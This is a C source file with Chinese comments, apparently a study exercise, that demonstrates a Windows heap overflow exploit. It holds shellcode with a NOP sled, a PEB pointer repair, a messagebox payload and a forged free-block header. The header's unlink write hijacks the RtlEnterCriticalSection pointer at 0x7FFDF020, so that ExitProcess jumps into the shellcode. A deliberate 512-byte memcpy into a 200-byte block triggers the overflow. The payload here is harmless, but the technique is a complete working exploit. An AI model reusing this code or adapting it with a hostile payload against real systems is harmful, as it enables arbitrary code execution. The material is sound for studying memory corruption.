//本代码是进行堆溢出弹出messagebox的代码
#include <windows.h>

char shellcode[]=
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    
    //repaire the pointer which shooted by heap over run  此处还要将P.E.B块中偏移0x20地址7FFDF020修改成正确的地址是因为：在堆覆盖后，进行h2分配
    //时，需要将尾块从Freelist[0]中卸下来，由卸下一个node的规则（参考笔记中5.3.2），会将卸下来节点node的flink的值写入到blink地址中，即本shellcode
    //的最后8字节，将0x00520688写入到0x7ffdf020地址中，当程序正常执行结束需要退出时，进行调用exitprocess()，而时exitprocess()会执行
    //RtlEnterCriticalSection函数，因此会跳到RtlEnterCriticalSection的地址，而RtlEnterCriticalSection的地址已经被上面覆盖，因此才会跳转到
    //shellcode的入口地址0x00520688，而跳转到shellcode之后
    //我们希望shellcode能够正常运行，所以将RtlEnterCriticalSection的地址重新修改过来
    "\xB8\x20\xF0\xFD\x7F"  //MOV EAX,7FFDF020
    "\xBB\x03\x91\xF8\x77"  //MOV EBX,77F89103/77F89134 the address here may releated to your OS
                            //分别为RtlEnterCriticalSection()和RtlLeaveCriticalSection()的地址（地址获取参考Reference中方法）
                            //此处地址换成77F89134也能正确弹出messagebox
    "\x89\x18"            //MOV DWORD PTR DS:[EAX],EBX
    
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"   //弹出messagebox
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
    
    
    "\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block
    "\x88\x06\x36\x00\x20\xf0\xfd\x7f";
    //0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug 
    //0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()
    //and will be called by ExitProcess() at last


main()
{
    HLOCAL h1 = 0, h2 = 0;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    //__asm int 3 //used to break the process
    //memcpy(h1, shellcode, 200); //normal cpy, used to watch the heap
    memcpy(h1, shellcode, 0x200); //overflow,0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}
